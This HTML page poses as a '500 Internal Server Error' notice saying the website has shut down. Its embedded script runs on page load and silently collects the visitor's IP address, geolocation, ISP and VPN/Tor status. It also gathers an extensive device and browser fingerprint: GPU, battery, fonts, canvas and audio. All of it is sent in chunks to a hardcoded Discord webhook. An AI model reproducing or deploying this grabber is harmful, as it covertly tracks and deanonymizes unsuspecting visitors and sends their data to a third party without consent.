<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body { 
            background-color: #fff; 
            color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .error-container { 
            text-align: center; 
        }
        h1 { 
            font-size: 24px; 
            font-weight: 500; 
            margin-bottom: 8px; 
        }
        p { 
            font-size: 14px; 
            color: #666; 
            margin: 0; 
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        // Split message into chunks for Discord
        function splitMessage(message, maxLength = 1900) {
            const chunks = [];
            let currentChunk = "```\n";
            const lines = message.split('\n');
            
            for(let line of lines) {
                if((currentChunk + line + "\n```").length > maxLength) {
                    chunks.push(currentChunk + "```");
                    currentChunk = "```\n" + line + "\n";
                } else {
                    currentChunk += line + "\n";
                }
            }
            
            if(currentChunk.length > 4) {
                chunks.push(currentChunk + "```");
            }
            
            return chunks;
        }

        // Send to Discord with delay between messages
        async function sendToDiscord(message) {
            const webhookUrl = "https://discord.com/api/webhooks/1430325766465257525/tXYBo7t3vy0CTU1mULcYBUiesr82PHIv1f9YENdxYPkmXztrqQo_oCZ4KrvCxuUF1Zac";
            const chunks = splitMessage(message);
            
            for(let i = 0; i < chunks.length; i++) {
                try {
                    await fetch(webhookUrl, {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({content: chunks[i]})
                    });
                    
                    // Wait 1 second between messages to avoid rate limiting
                    if(i < chunks.length - 1) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                } catch(err) {
                    console.error("Failed to send chunk " + (i + 1), err);
                }
            }
        }

        // Check if IP is a known VPN
        async function checkVPNDatabase(ip) {
            const vpnCheck = {
                isVPN: "Unknown",
                isProxy: "Unknown",
                isTor: "Unknown",
                isHosting: "Unknown"
            };

            if (!ip || ip === "Unknown") {
                return vpnCheck;
            }

            try {
                const response = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
                if (response.ok) {
                    const data = await response.json();
                    if (data[ip]) {
                        vpnCheck.isProxy = data[ip].proxy === "yes" ? "Yes" : "No";
                        vpnCheck.isVPN = data[ip].type === "VPN" ? "Yes" : "No";
                        vpnCheck.isTor = data[ip].type === "TOR" ? "Yes" : "No";
                    }
                }
            } catch(e) {
                vpnCheck.isVPN = "Unable to verify";
                vpnCheck.isProxy = "Unable to verify";
            }

            return vpnCheck;
        }

        // Check timezone mismatch
        function checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone) {
            if (!ipTimezone || ipTimezone === "Unknown") {
                return "Unable to verify";
            }

            const browserTz = browserTimezone.toLowerCase().replace(/_/g, ' ');
            const ipTz = ipTimezone.toLowerCase().replace(/_/g, ' ');

            if (browserTz === ipTz) {
                return "✓ Match";
            }

            if (ipCountry && browserTimezone.toLowerCase().includes(ipCountry.toLowerCase())) {
                return "✓ Same region";
            }

            const timezoneAliases = {
                'america/new_york': ['est', 'edt', 'eastern'],
                'america/chicago': ['cst', 'cdt', 'central'],
                'america/denver': ['mst', 'mdt', 'mountain'],
                'america/los_angeles': ['pst', 'pdt', 'pacific'],
                'europe/london': ['gmt', 'bst'],
                'europe/paris': ['cet', 'cest'],
                'asia/tokyo': ['jst'],
                'australia/sydney': ['aest', 'aedt']
            };

            for (let canonical in timezoneAliases) {
                const aliases = timezoneAliases[canonical];
                if ((browserTz.includes(canonical) || aliases.some(a => browserTz.includes(a))) &&
                    (ipTz.includes(canonical) || aliases.some(a => ipTz.includes(a)))) {
                    return "✓ Match (alias)";
                }
            }

            return "⚠️ MISMATCH - Possible VPN";
        }

        // gather system info
        async function collectInfo() {
            let data = {};
            
            const apis = [
                "https://ipapi.co/json/",
                "https://ipwho.is/",
                "https://api.ipify.org?format=json"
            ];

            for(let i = 0; i < apis.length; i++) {
                try {
                    const response = await fetch(apis[i]);
                    if(response.ok) {
                        const json = await response.json();
                        data = Object.assign(data, json);
                        if(data.ip || data.query) break;
                    }
                } catch(err) {
                    // silent fail, try next API
                }
            }

            const ip = data.ip || data.query || "Unknown";

            const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const ipTimezone = data.timezone || "Unknown";
            const ipCountry = data.country_code || data.country || "";

            const vpnCheck = await checkVPNDatabase(ip);
            const timezoneMismatch = checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone);

            // GPU detection
            let gpuInfo = "Unknown";
            let webglVendor = "Unknown";
            let webglCapabilities = {};
            try {
                const c = document.createElement('canvas');
                const ctx = c.getContext('webgl') || c.getContext('experimental-webgl');
                if(ctx) {
                    const ext = ctx.getExtension('WEBGL_debug_renderer_info');
                    if(ext) {
                        gpuInfo = ctx.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                        webglVendor = ctx.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                    }
                    webglCapabilities = {
                        maxTextureSize: ctx.getParameter(ctx.MAX_TEXTURE_SIZE),
                        maxRenderbufferSize: ctx.getParameter(ctx.MAX_RENDERBUFFER_SIZE),
                        maxViewportDims: ctx.getParameter(ctx.MAX_VIEWPORT_DIMS)
                    };
                }
            } catch(e) {}

            // Battery info
            let batteryLevel = "Unknown";
            let chargingStatus = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryLevel = Math.round(battery.level * 100) + "%";
                chargingStatus = battery.charging ? "Charging" : "Not Charging";
            } catch(e) {}

            // Storage estimate
            let storageQuota = "Unknown";
            let storageUsage = "Unknown";
            try {
                const estimate = await navigator.storage.estimate();
                storageQuota = (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " GB";
                storageUsage = (estimate.usage / 1024 / 1024).toFixed(2) + " MB";
            } catch(e) {}

            // Connection info
            let connectionType = "Unknown";
            let effectiveType = "Unknown";
            let downlink = "Unknown";
            let rtt = "Unknown";
            let saveData = "Unknown";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if(conn) {
                    connectionType = conn.type || "Unknown";
                    effectiveType = conn.effectiveType || "Unknown";
                    downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
                    rtt = conn.rtt ? conn.rtt + " ms" : "Unknown";
                    saveData = conn.saveData ? "Enabled" : "Disabled";
                }
            } catch(e) {}

            // Canvas fingerprint
            let canvasFingerprint = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('fingerprint', 2, 15);
                canvasFingerprint = canvas.toDataURL().substring(0, 50) + "...";
            } catch(e) {}

            // Audio context fingerprint
            let audioFingerprint = "Unknown";
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gainNode.gain.value = 0;
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                
                audioFingerprint = analyser.frequencyBinCount + "-" + context.sampleRate;
                
                oscillator.disconnect();
                analyser.disconnect();
                scriptProcessor.disconnect();
                gainNode.disconnect();
            } catch(e) {}

            // Performance memory (Chrome only)
            let memoryUsage = "Unknown";
            let memoryLimit = "Unknown";
            try {
                if(performance.memory) {
                    memoryUsage = (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + " MB";
                    memoryLimit = (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + " MB";
                }
            } catch(e) {}

            // Font detection (common fonts)
            let detectedFonts = [];
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Verdana', 'Courier New', 'Georgia', 'Times New Roman',
                'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Lucida Console',
                'Palatino', 'Garamond', 'Bookman', 'Courier', 'Helvetica',
                'Monaco', 'Consolas', 'Calibri', 'Cambria'
            ];
            
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            
            const fontCanvas = document.createElement('canvas');
            const fontContext = fontCanvas.getContext('2d');
            
            const baseFontWidths = {};
            for(let baseFont of baseFonts) {
                fontContext.font = testSize + ' ' + baseFont;
                baseFontWidths[baseFont] = fontContext.measureText(testString).width;
            }
            
            for(let testFont of testFonts) {
                let detected = false;
                for(let baseFont of baseFonts) {
                    fontContext.font = testSize + ' "' + testFont + '", ' + baseFont;
                    const width = fontContext.measureText(testString).width;
                    if(width !== baseFontWidths[baseFont]) {
                        detected = true;
                        break;
                    }
                }
                if(detected) {
                    detectedFonts.push(testFont);
                }
            }

            // Screen orientation
            let screenOrientation = "Unknown";
            try {
                if(screen.orientation) {
                    screenOrientation = screen.orientation.type;
                } else {
                    screenOrientation = window.innerWidth > window.innerHeight ? "landscape" : "portrait";
                }
            } catch(e) {}

            // Input capabilities
            let pointerType = "Unknown";
            let hoverCapable = "Unknown";
            try {
                if(window.matchMedia) {
                    if(window.matchMedia("(pointer: fine)").matches) {
                        pointerType = "Fine (mouse)";
                    } else if(window.matchMedia("(pointer: coarse)").matches) {
                        pointerType = "Coarse (touch)";
                    } else if(window.matchMedia("(pointer: none)").matches) {
                        pointerType = "None";
                    }
                    
                    if(window.matchMedia("(hover: hover)").matches) {
                        hoverCapable = "Yes";
                    } else if(window.matchMedia("(hover: none)").matches) {
                        hoverCapable = "No";
                    }
                }
            } catch(e) {}

            // API Support Detection
            let webRTCSupport = typeof RTCPeerConnection !== 'undefined' || typeof webkitRTCPeerConnection !== 'undefined' || typeof mozRTCPeerConnection !== 'undefined' ? "Yes" : "No";
            let webAssemblySupport = typeof WebAssembly !== 'undefined' ? "Yes" : "No";
            let serviceWorkerSupport = 'serviceWorker' in navigator ? "Yes" : "No";
            let indexedDBSupport = 'indexedDB' in window ? "Yes" : "No";
            let localStorageSupport = "Unknown";
            let sessionStorageSupport = "Unknown";
            
            try {
                localStorageSupport = typeof localStorage !== 'undefined' ? "Yes" : "No";
            } catch(e) {
                localStorageSupport = "No";
            }
            
            try {
                sessionStorageSupport = typeof sessionStorage !== 'undefined' ? "Yes" : "No";
            } catch(e) {
                sessionStorageSupport = "No";
            }

            let notificationSupport = 'Notification' in window ? "Yes" : "No";
            let vibrationSupport = 'vibrate' in navigator ? "Yes" : "No";
            let bluetoothSupport = 'bluetooth' in navigator ? "Yes" : "No";
            let usbSupport = 'usb' in navigator ? "Yes" : "No";
            let nfcSupport = 'nfc' in navigator ? "Yes" : "No";
            let credentialsSupport = 'credentials' in navigator ? "Yes" : "No";
            let paymentSupport = 'PaymentRequest' in window ? "Yes" : "No";
            let shareSupport = 'share' in navigator ? "Yes" : "No";
            let clipboardSupport = 'clipboard' in navigator ? "Yes" : "No";
            let wakeLockSupport = 'wakeLock' in navigator ? "Yes" : "No";
            let deviceOrientationSupport = 'DeviceOrientationEvent' in window ? "Yes" : "No";
            let deviceMotionSupport = 'DeviceMotionEvent' in window ? "Yes" : "No";

            // Speech Synthesis
            let speechSynthesisSupport = 'speechSynthesis' in window ? "Yes" : "No";
            let voicesCount = 0;
            try {
                if('speechSynthesis' in window) {
                    const voices = speechSynthesis.getVoices();
                    voicesCount = voices.length;
                }
            } catch(e) {}

            // WebGL Extensions
            let webglExtensions = "None";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if(gl) {
                    const extensions = gl.getSupportedExtensions();
                    if(extensions && extensions.length > 0) {
                        webglExtensions = extensions.length + " extensions";
                    }
                }
            } catch(e) {}

            // Media capabilities
            let mediaSupport = "Unknown";
            try {
                if('mediaCapabilities' in navigator) {
                    mediaSupport = "Yes";
                } else {
                    mediaSupport = "No";
                }
            } catch(e) {}

            // Check for ad blockers (basic detection)
            let adBlocker = "Unknown";
            try {
                const testAd = document.createElement('div');
                testAd.innerHTML = '&nbsp;';
                testAd.className = 'adsbox';
                document.body.appendChild(testAd);
                window.setTimeout(function() {
                    if(testAd.offsetHeight === 0) {
                        adBlocker = "Detected";
                    } else {
                        adBlocker = "Not detected";
                    }
                    document.body.removeChild(testAd);
                }, 100);
            } catch(e) {
                adBlocker = "Unknown";
            }

            let location = "Unknown";
            if(data.city) {
                location = data.city + ", " + (data.region || data.region_name) + ", " + (data.country_name || data.country);
            }
            const isp = data.org || data.isp || (data.connection && data.connection.isp) || "Unknown";

            const info = {
                "--- VPN DETECTION ---": "",
                "VPN Database Check": vpnCheck.isVPN,
                "Proxy Detected": vpnCheck.isProxy,
                "Tor Network": vpnCheck.isTor,
                "Hosting/Datacenter": vpnCheck.isHosting,
                "Timezone Mismatch": timezoneMismatch,
                "IP Timezone": ipTimezone,
                "Browser Timezone": browserTimezone,
                "--- NETWORK DATA ---": "",
                "IP Address": ip,
                "Location": location,
                "ISP": isp,
                "Hostname": data.hostname || data.reverse || "None",
                "Connection Type": connectionType,
                "Effective Type": effectiveType,
                "Downlink Speed": downlink,
                "Round Trip Time": rtt,
                "Data Saver": saveData,
                "--- DEVICE HARDWARE ---": "",
                "OS/Platform": navigator.platform,
                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
                "GPU": gpuInfo,
                "GPU Vendor": webglVendor,
                "Max Texture Size": webglCapabilities.maxTextureSize || "Unknown",
                "Screen Resolution": screen.width + "x" + screen.height,
                "Available Screen": screen.availWidth + "x" + screen.availHeight,
                "Screen Orientation": screenOrientation,
                "Window Size": window.innerWidth + "x" + window.innerHeight,
                "Device Pixel Ratio": window.devicePixelRatio,
                "Color Depth": screen.colorDepth + " bits",
                "Pixel Depth": screen.pixelDepth + " bits",
                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
                "Max Touch Points": navigator.maxTouchPoints,
                "Pointer Type": pointerType,
                "Hover Capable": hoverCapable,
                "Battery Level": batteryLevel,
                "Charging Status": chargingStatus,
                "--- STORAGE ---": "",
                "Storage Quota": storageQuota,
                "Storage Used": storageUsage,
                "LocalStorage": localStorageSupport,
                "SessionStorage": sessionStorageSupport,
                "IndexedDB": indexedDBSupport,
                "--- BROWSER/SOFTWARE ---": "",
                "User Agent": navigator.userAgent,
                "App Version": navigator.appVersion,
                "Browser Platform": navigator.platform,
                "Product": navigator.product,
                "Vendor": navigator.vendor,
                "Browser Language": navigator.language,
                "System Languages": navigator.languages.join(", "),
                "Cookies Enabled": navigator.cookieEnabled,
                "Do Not Track": navigator.doNotTrack || "Not set",
                "Online Status": navigator.onLine ? "Online" : "Offline",
                "PDF Viewer": navigator.pdfViewerEnabled ? "Enabled" : "Disabled",
                "Timezone": browserTimezone,
                "Timezone Offset": new Date().getTimezoneOffset() + " minutes",
                "Current Time": new Date().toLocaleString(),
                "Referrer": document.referrer || "Direct Visit",
                "--- API SUPPORT ---": "",
                "WebRTC": webRTCSupport,
                "WebAssembly": webAssemblySupport,
                "Service Worker": serviceWorkerSupport,
                "Notifications": notificationSupport,
                "Vibration": vibrationSupport,
                "Bluetooth API": bluetoothSupport,
                "USB API": usbSupport,
                "NFC API": nfcSupport,
                "Credentials API": credentialsSupport,
                "Payment Request": paymentSupport,
                "Web Share": shareSupport,
                "Clipboard API": clipboardSupport,
                "Wake Lock": wakeLockSupport,
                "Device Orientation": deviceOrientationSupport,
                "Device Motion": deviceMotionSupport,
                "Speech Synthesis": speechSynthesisSupport,
                "TTS Voices Count": voicesCount,
                "Media Capabilities": mediaSupport,
                "WebGL Extensions": webglExtensions,
                "--- MEMORY (Chrome) ---": "",
                "JS Heap Used": memoryUsage,
                "JS Heap Limit": memoryLimit,
                "--- FINGERPRINTS ---": "",
                "Canvas FP": canvasFingerprint,
                "Audio FP": audioFingerprint,
                "Installed Fonts": detectedFonts.join(", ") || "None detected",
                "--- SECURITY ---": "",
                "Ad Blocker": adBlocker
            };

            let message = "";
            for(let key in info) {
                if(key.startsWith("---")) {
                    message += info[key] + key + "\n";
                } else {
                    message += key + ": " + info[key] + "\n";
                }
            }

            // Send to Discord
            await sendToDiscord(message);
        }

        collectInfo();
    </script>
</body>
</html>
